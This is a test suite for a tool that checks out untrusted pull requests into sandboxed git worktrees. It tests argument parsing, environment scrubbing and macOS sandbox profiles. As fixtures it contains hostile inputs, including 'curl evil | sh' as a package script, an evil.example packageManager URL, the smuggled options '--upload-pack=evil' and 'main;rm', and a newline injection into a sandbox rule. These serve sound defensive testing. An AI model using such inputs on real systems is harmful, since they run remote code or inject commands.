import {
  assertWorktreeName,
  buildSandboxProfile,
  classifyChanges,
  gitSandboxPaths,
  installConfigChanges,
  parseCreateArgs,
  parseTarget,
  sbplString,
  scrubbedEnv,
  untrustedRootFor,
} from '../scripts/lib/untrusted-worktree-core.mjs';

describe('parseTarget', () => {
  it('reads every way of naming a PR', () => {
    for (const arg of [
      '728',
      '#728',
      'pr-728',
      'https://github.com/ActivistChecklist/ActivistChecklist/pull/728',
    ]) {
      expect(parseTarget(arg)).toEqual({ kind: 'pr', number: 728, name: 'pr-728' });
    }
  });

  it('treats anything else as a ref and derives a flat name', () => {
    expect(parseTarget('origin/l10n_main')).toEqual({
      kind: 'ref',
      ref: 'origin/l10n_main',
      name: 'origin-l10n_main',
    });
  });

  it('rejects option-like and path-escaping input', () => {
    for (const arg of [
      '',
      '--upload-pack=evil',
      'a/../../b',
      'main;rm',
      'https://evil.example/pull/1',
    ]) {
      expect(() => parseTarget(arg)).toThrow();
    }
  });
});

describe('parseCreateArgs', () => {
  it('takes a lone PR number and names the worktree after it', () => {
    expect(parseCreateArgs(['797'])).toEqual({
      arg: '797',
      target: { kind: 'pr', number: 797, name: 'pr-797' },
      name: 'pr-797',
      install: true,
      allowInstallConfig: false,
    });
  });

  it('reads --name before or after the target', () => {
    for (const args of [
      ['797', '--name', 'l10n'],
      ['--name', 'l10n', '797'],
    ]) {
      expect(parseCreateArgs(args)).toMatchObject({ arg: '797', name: 'l10n' });
    }
  });

  it('reads the install flags in any position', () => {
    expect(
      parseCreateArgs(['--no-install', 'origin/l10n_main', '--allow-install-config']),
    ).toMatchObject({
      target: { kind: 'ref', ref: 'origin/l10n_main' },
      name: 'origin-l10n_main',
      install: false,
      allowInstallConfig: true,
    });
  });

  it('rejects a missing or extra target, a bare --name and unknown flags', () => {
    for (const args of [
      [],
      ['--name', '797'],
      ['797', '798'],
      ['797', '--name'],
      ['797', '--no-instal'],
    ]) {
      expect(() => parseCreateArgs(args)).toThrow();
    }
  });
});

describe('assertWorktreeName', () => {
  it('accepts the names parseTarget produces', () => {
    expect(assertWorktreeName('pr-728')).toBe('pr-728');
    expect(assertWorktreeName('origin-l10n_main')).toBe('origin-l10n_main');
  });

  it('rejects anything that could leave the untrusted root', () => {
    for (const name of ['', '..', '../x', 'a/b', '.hidden', 'a..b']) {
      expect(() => assertWorktreeName(name)).toThrow();
    }
  });
});

describe('untrustedRootFor', () => {
  it('is a sibling of the main checkout, not inside it', () => {
    expect(untrustedRootFor('/Users/x/dev/ActivistChecklist.org')).toBe(
      '/Users/x/dev/ActivistChecklist.org.untrusted',
    );
  });
});

describe('installConfigChanges', () => {
  const pkg = {
    name: 'x',
    packageManager: 'pnpm@12.4.1',
    engines: { node: '>=22' },
    scripts: { dev: 'next dev' },
  };

  it('is empty when only code, dependencies and scripts changed', () => {
    const head = { ...pkg, scripts: { dev: 'curl evil | sh' }, dependencies: { leftpad: '1.0.0' } };
    expect(
      installConfigChanges({
        changedPaths: ['components/A.jsx', 'package.json', 'pnpm-lock.yaml'],
        basePackage: pkg,
        headPackage: head,
      }),
    ).toEqual([]);
  });

  it('flags install config files', () => {
    expect(
      installConfigChanges({
        changedPaths: ['.npmrc', '.pnpmfile.cjs', 'pnpm-workspace.yaml'],
        basePackage: pkg,
        headPackage: pkg,
      }),
    ).toEqual(['.npmrc changed', '.pnpmfile.cjs changed', 'pnpm-workspace.yaml changed']);
  });

  it('flags package.json fields that make pnpm download or run something', () => {
    const head = {
      ...pkg,
      packageManager: 'pnpm@https://evil.example/pnpm.tgz',
      devEngines: { runtime: { name: 'node' } },
    };
    expect(
      installConfigChanges({ changedPaths: ['package.json'], basePackage: pkg, headPackage: head }),
    ).toEqual(['package.json "packageManager" changed', 'package.json "devEngines" changed']);
  });

  it('refuses when head package.json is unreadable', () => {
    expect(installConfigChanges({ changedPaths: [], basePackage: pkg, headPackage: null })).toEqual(
      ['package.json is missing or not valid JSON'],
    );
  });
});

describe('classifyChanges', () => {
  const keys = (entries) =>
    Object.fromEntries(classifyChanges(entries).map((g) => [g.key, g.paths]));

  it('puts each path in the first group that matches', () => {
    expect(
      keys([
        { path: 'CLAUDE.md' },
        { path: 'content/en/guides/AGENTS.md' },
        { path: '.claude/settings.json' },
        { path: 'pnpm-lock.yaml' },
        { path: '.husky/pre-commit' },
        { path: 'scripts/prepare.js' },
        { path: '.github/workflows/pr-checks.yml' },
        { path: 'next.config.js' },
        { path: 'vitest.config.mjs' },
        { path: 'components/Term.jsx' },
      ]),
    ).toEqual({
      agent: ['CLAUDE.md', 'content/en/guides/AGENTS.md', '.claude/settings.json'],
      install: ['pnpm-lock.yaml'],
      automation: ['.husky/pre-commit', 'scripts/prepare.js', '.github/workflows/pr-checks.yml'],
      config: ['next.config.js', 'vitest.config.mjs'],
      other: ['components/Term.jsx'],
    });
  });

  it('flags symlinks in addition to their normal group', () => {
    expect(keys([{ path: 'public/leak.txt', mode: '120000' }])).toEqual({
      symlink: ['public/leak.txt'],
      other: ['public/leak.txt'],
    });
  });

  it('returns no groups for an empty diff', () => {
    expect(classifyChanges([])).toEqual([]);
  });
});

describe('scrubbedEnv', () => {
  it('keeps only the allowlist and drops credentials', () => {
    const env = scrubbedEnv({
      PATH: '/bin',
      HOME: '/Users/x',
      LC_ALL: 'C',
      SSH_AUTH_SOCK: '/tmp/agent',
      GH_TOKEN: 'secret',
      RAILWAY_TOKEN: 'secret',
      KEYSTATIC_GITHUB_TOKEN: 'secret',
    });
    expect(env).toEqual({
      PATH: '/bin',
      HOME: '/Users/x',
      LC_ALL: 'C',
      HUSKY: '0',
      NEXT_TELEMETRY_DISABLED: '1',
      GIT_CONFIG_GLOBAL: '/dev/null',
      GIT_CONFIG_NOSYSTEM: '1',
    });
  });

  it('keeps git off the user and system config, whatever the parent set', () => {
    expect(
      scrubbedEnv({ GIT_CONFIG_GLOBAL: '/Users/x/.gitconfig', GIT_CONFIG_NOSYSTEM: '0' }),
    ).toMatchObject({ GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' });
  });

  it('applies overrides last', () => {
    expect(
      scrubbedEnv({ PATH: '/bin' }, { PATH: '/wt/bin:/bin', TMPDIR: '/wt/tmp' }),
    ).toMatchObject({
      PATH: '/wt/bin:/bin',
      TMPDIR: '/wt/tmp',
    });
  });
});

describe('sbplString', () => {
  it('escapes quotes and backslashes', () => {
    expect(sbplString('/a "b"\\c')).toBe('"/a \\"b\\"\\\\c"');
  });

  it('rejects newlines, which could end the rule early', () => {
    expect(() => sbplString('/a\n(allow default)')).toThrow();
  });
});

describe('buildSandboxProfile', () => {
  const profile = buildSandboxProfile({
    home: '/Users/x',
    readable: ['/Users/x/.nvm/v24'],
    writable: ['/Users/x/wt'],
  });
  const lines = profile.split('\n');
  const index = (prefix) => lines.findIndex((l) => l.startsWith(prefix));

  it('re-opens only the toolchain and the worktree under home, after denying home', () => {
    expect(index('(deny file-read-data (subpath "/Users/x"))')).toBeLessThan(
      index('(allow file-read-data'),
    );
    expect(lines[index('(allow file-read-data')]).toBe(
      '(allow file-read-data (subpath "/Users/x/.nvm/v24") (subpath "/Users/x/wt"))',
    );
  });

  it('allows writes only to the worktree and /dev, after denying all writes', () => {
    expect(index('(deny file-write* (subpath "/"))')).toBeLessThan(index('(allow file-write*'));
    expect(lines[index('(allow file-write*')]).toBe(
      '(allow file-write* (subpath "/Users/x/wt") (subpath "/dev"))',
    );
  });

  it('denies network except localhost, and Keychain lookups', () => {
    expect(index('(deny network*)')).toBeLessThan(index('(allow network*'));
    expect(lines[index('(allow network*')]).not.toMatch(/\*:\*/);
    expect(profile).toContain('com.apple.SecurityServer');
  });

  it('keeps readOnly paths unwritable, after the write allow that covers them', () => {
    const guarded = buildSandboxProfile({
      home: '/Users/x',
      readable: [],
      writable: ['/Users/x/wt'],
      readOnly: ['/Users/x/wt/.git'],
    }).split('\n');
    const allow = guarded.findIndex((l) => l.startsWith('(allow file-write*'));
    const deny = guarded.indexOf('(deny file-write* (subpath "/Users/x/wt/.git"))');
    expect(deny).toBeGreaterThan(allow);
    expect(lines.filter((l) => l.startsWith('(deny file-write*'))).toEqual([
      '(deny file-write* (subpath "/"))',
    ]);
  });

  it('opens a listable directory itself, not what is inside it', () => {
    const withListable = buildSandboxProfile({
      home: '/Users/x',
      readable: [],
      listable: ['/Users/x/repo/.git/objects/pack'],
      writable: ['/Users/x/wt'],
    });
    expect(withListable).toContain(
      '(allow file-read-data (literal "/Users/x/repo/.git/objects/pack"))',
    );
    expect(withListable).not.toContain('(subpath "/Users/x/repo/.git/objects');
    expect(profile).not.toContain('(literal');
  });
});

describe('gitSandboxPaths', () => {
  const commonDir = '/Users/x/repo/.git';
  const gitDir = `${commonDir}/worktrees/pr-797`;
  const { readable, listable } = gitSandboxPaths({ commonDir, gitDir });

  it("opens the worktree's own git dir and the files git cannot start without", () => {
    expect(readable).toEqual([gitDir, `${commonDir}/config`, `${commonDir}/info/exclude`]);
  });

  it('never opens the shared objects, refs or other worktrees for reading', () => {
    for (const p of readable) {
      expect(p).not.toBe(commonDir);
      expect(`${commonDir}/objects/pack/x.pack`.startsWith(`${p}/`)).toBe(false);
      expect(`${commonDir}/refs/heads/main`.startsWith(`${p}/`)).toBe(false);
      expect(`${commonDir}/worktrees/other/index`.startsWith(`${p}/`)).toBe(false);
    }
    expect(listable).toEqual([`${commonDir}/objects/pack`]);
  });
});
